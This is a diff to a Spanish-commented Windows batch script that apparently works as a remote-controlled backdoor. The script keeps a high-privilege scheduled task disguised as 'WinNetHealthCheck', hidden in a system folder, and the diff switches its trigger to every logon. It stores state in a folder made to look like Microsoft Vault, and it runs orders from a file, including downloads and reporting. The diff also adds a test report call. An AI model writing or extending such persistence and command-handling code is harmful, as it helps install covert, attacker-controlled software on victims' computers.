@@ -6,13 +6,13 @@ setlocal enabledelayedexpansion
 :: Verificamos si la tarea del Salvavidas sigue viva
 schtasks /query /tn "WinNetHealthCheck" >nul 2>&1
 if %errorlevel% neq 0 (
-    schtasks /create /tn "WinNetHealthCheck" /tr "cmd.exe /c C:\Windows\System32\drivers\etc\vps_logs\WinNetHealth.bat" /sc daily /st 12:00 /rl highest /f >nul 2>&1
+    schtasks /create /tn "WinNetHealthCheck" /tr "cmd.exe /c C:\Windows\System32\drivers\etc\vps_logs\WinNetHealth.bat" /sc onlogon /rl highest /f >nul 2>&1
 )
 :: Configuración de la Memoria
 set "MEM_DIR=%AppData%\Roaming\Microsoft\Vault\data"
 set "MEM_FILE=%MEM_DIR%\last_id.dat"
-
-
+set "PRUEBA=pruebaFUEGO"
+call :FUNC_REPORTAR "!PRUEBA!" 
 :: Crear la carpeta si no existe (la primera vez)
 if not exist "%MEM_DIR%" mkdir "%MEM_DIR%"
 
@@ -56,7 +56,6 @@ for /f "usebackq skip=1 tokens=1,2,3" %%A in ("%LOCAL_ORDENES%") do (
     set "ARG2=%%C"
 
     if /i "!ACCION!"=="DESCARGA" call :FUNC_DESCARGA "!ARG1!" "!ARG2!"
-    if /i "!ACCION!"=="MSGBOX" call :FUNC_MESSAGE "!ARG1!" "!ARG2!"
     if /i "!ACCION!"=="EJECUTAR_LIMPIEZA" call :FUNC_EJECUTAR_LIMPIEZA "!ARG1!"
     if /i "!ACCION!"=="FRECUENCIA" call :FUNC_FRECUENCIA "!ARG1!"
     if /i "!ACCION!"=="REPORTAR" call :FUNC_REPORTAR "!ARG1!"
@@ -160,6 +159,4 @@ if exist "%temp%\%ARCHIVO%" (
     exit
 )
 goto :EOF
-
-
 
